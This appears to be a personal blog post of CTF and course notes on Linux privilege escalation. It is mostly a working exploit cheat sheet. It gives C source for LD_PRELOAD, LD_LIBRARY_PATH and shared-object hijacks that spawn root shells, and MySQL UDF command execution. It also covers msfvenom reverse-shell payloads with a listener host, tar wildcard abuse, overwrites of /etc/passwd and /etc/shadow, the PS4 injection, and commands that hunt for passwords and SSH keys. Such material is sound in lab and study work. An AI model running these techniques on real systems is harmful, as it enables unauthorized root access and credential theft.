---
title: "Linux Privilige Escalation"
date: 2024-03-23
categories:
  - CTF
tags:
  - CTF
---

<center><img src="https://static.wikia.nocookie.net/ozwikia/images/0/00/Frogman.png/revision/latest?cb=20130406054431" width="200" height="250"></center>


This article is all about the commands, techniques and exploits for successfuly doing `Linux Privilige Escalation`.

> Effectively these are the notes which i have taken out of multiple courses over time. 

## Information Gathering. 

- `hostname`
- `uname -a`
- `cat /etc/issue`
- `lscp`
- `ps aux`
- `whoami`
- `id`
- `sudo -l`
- `cat /etc/passwd`
- `cat /etc/shadow`
- `cat /etc/group`
- `history`
- `sudo su -`
- `netstat -a`
- `ifconfig`
- `route`
- `ip route`
- `arp -a`
- `ip neigh`
- `cat /etc/proc`
- `netstat -ano`

## Hunting For Passwords.

```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null
```
```
locate password | more
```
```
localte pass | more
```

## Hunting For SSH Keys

```
find / -name id_rsa -type f 2>/dev/null
```
```
find / -name ssh -type f 2>/dev/null
```

## Automated Hunting

- [LinPeas - Website](https://linpeas.sh/)
- [LinPEAS - GitHUb](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [Linux-Exploit-Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
- [Linux-Priv-Checker](https://github.com/sleventyeleven/linuxprivchecker)

## Exploitation

### 1. Service Exploits

Checking the `ps -aux` for the processes and observing that `MYSQL` is running as `root` user. 

> Exploiting the User Defined Fuctions (UDFs) to run system commands. 

- https://www.exploit-db.com/exploits/1518


```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

> mysql -u root

Creating UDFs.

```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```
Coppying the `/bin/bash` to `/tmp/rootbash` and setting SUID permission.

`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`

Exiting from the shell and exedcuting `rootbash`

`/tmp/rootbash -p`

### 2. Weak File Permissions - /etc/shadow

In case shadow file is readable, copy the contents to a text file and use John or Hydra to crack the hashes and login as the user.

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

### 3. Writable File Permissions - /etc/shadow

In case shadow file is writable, we can generate a username and password and can have it added directly to the `/etc/shadow` file. 

`mkpasswd -m sha-512 <PASSWORD>`

### 4. Weak File Permissions - Writable /etc/passwd

In case the `/etc/passwd` file is writable we can take advantage by generating a username and password and having it added to the `/etc/passwd` file. 

`openssl passwd <PASSWORD>`

Replace, the root user with the generated password or any other user, change to login via that user and gain access.

### 5. Sudo - Shell Escape Sequences

Using the `sudo -l` command we can see which commands/programs can be executed by the current user in context of the other users. Thus, we can take advantage of all the programs listed here. 

- https://gtfobins.github.io/

### 6. Sudo - Environment Variables

`SUDO` command can be configured to use/call the `Environment Variables` from the current users environment. 

In order to see which `ENV` variables are set or being called run `sudo -l` command. 

Sample output as below.

```
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```
> LD-Preload is an optional environment variable that is used to set/load shared libraries to a program or script. If we set this value, we are telling the program to load the mentioned libraries before starting the program. 

Exploit Codes are as below.

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setuid(0);
	setgid(0);
	system("/bin/bash -p");
	}

```
> gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c

> sudo /tmp/exploit.so /opt/\<PROGRAM\>

The second exploit is as below.


``` 
preload.c
-------------------
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```
library_path.c
-------------------
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}

```

`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`

`sudo LD_PRELOAD=/tmp/preload.so program-name-here`

`ldd /usr/sbin/apache2`

`gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`

`sudo LD_LIBRARY_PATH=/tmp apache2`

### 7. Cronjob - Writable

Running `crontab -e` or `crontab -l` will result in the current cronjobs configured. 

> System wide crontab is located at `/etc/crontab`

Checking the system wide crontabs. 

`cat /etc/crontab`

Then find the script which is configured, overwrite it to gain remote/reverse shell.

### 8. Cronjob - PATH Envrironment Variable

In case cron configuration file is set to load the files/scripts/programs from the PATH environment varialbe, we can create a file in the same PATH and wait for the cron to execute. 

Example as below.

```
SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

### 9. Cronjob - WildCards (TAR)

Checking for the cronjobs which are executed by `sudo` or `root` and is using `tar` command. There is a possibility to leverage the `--checkpoint` attribute to read the file system. 

Creating a reverse shell.

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

Moving this file onto the victim machine and making it executable. 

`chmod +x shell.elf`


After this, creating two file in the current user directory. 

```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

Create a listener and get the reverse shell.

### 10. History Files

Use the following command to read the current history of the commands. 

`history`

Moreoever, 

`cat ~/.*history | less`

### 11. Config Files

Searching for the config files. 

`find / -name *.config -type f 2>/dev/null`

`find / -name *.auth -type f 2>/dev/null`

`find / -name *.ovpn -type f 2>/dev/null`

### 12. SSH Keys

`find / -name id_rsa -type f 2>/dev/null`

`find / -name *_key -type f 2>/dev/null`

`find / -name root_key -type f 2>/dev/null`

`find / -name .ssh -type f 2>/dev/null`

### 13. NFS - Network File Share

In order to validate which directories are exposed for NFS, we can check under `/etc/exports`.

The ideal candidate is going to be the one with `no_root_squash` setting enabled. If `root squash` is enable then probably its not going to be vulnerable due to additional controls. 

On the attacker machine, we need to create a NFS directory and map it to the exposed NFS directory on the victim machine. 

`mkdir /tmp/nfs`
`mount -o rw,vers=3 <IP ADDRESS>:/tmp /tmp/nfs`

Creeate a reverse shell and move it to the `/tmp/nfs`

```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

On a victim machine, execute the file to gain priv esc.

### 14. Kernel Exploits (Dirty Cow)

Compiling the exploit code. 

`gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w`

Executing it via `./cow`

- [Blog](https://dirtycow.ninja/)
- [Exploits](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

### 14. SUID/SGID - Known Exploits

Looking for he SUID and SGID binaries and whjatever results comes up reserach for the exploit and execute in on the machine. 

`find / -type f -a \(-perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null`

`find / -perm -u=s -type f 2>/dev/null`

### 15. SUID/SGID - Share Object Injection

This happens when a command is executed and it is trying to load a file which is not present, by creating a malicious file and executing it will help us takeover the machine and it will be executed in the context of the first command being executed. 

Example is as below. 

`/usr/local/bin/suid-so` is vulnerable to Share Object Injection. 

Using the strace to trace the calls of the binary, we can look for the mising items/calls. 

`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`

The results shows that executable is trying to load the file present in the `/home/user/.config` directory named `libcalc.c`.

`mkdir /home/user/.config`

```
libcalc.c
-------------------------
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```

Compiling the code and executing the same binary leads us to priv-esc.

`gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`

### 16. SUID/SGID - Environment Variables

When the commands are executed by the programs with no absolute PATHs, it is possible to hijack them by adding malicious code into the PATH environment variable. 

```
service.c
--------------
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```
`gcc -o service /home/user/tools/suid/service.c` and finally adding it to the PATH `PATH=.:$PATH /usr/local/bin/suid-env`

### 17. SUID/SGID - Abusing Shell Features 1

Bash version < 4.2-048 allowed the users to define shell functions with the names that resemble file paths, then you can export these functions and can be used instead of the actual executable at that file path. 

`/bin/bash --version` to match the target version.

```
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/bin/service
```

Call the program which is required to call this server and gain root. 

### 18. SUID/SGID - Abusing Shell Features 2

Bash < 4.4 uses environment variable `PS4` to display extra prompt for debuggging information.

Thus, by adding an embedded command into the `PS4` environment variable we can hijack the root account. 

`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`

---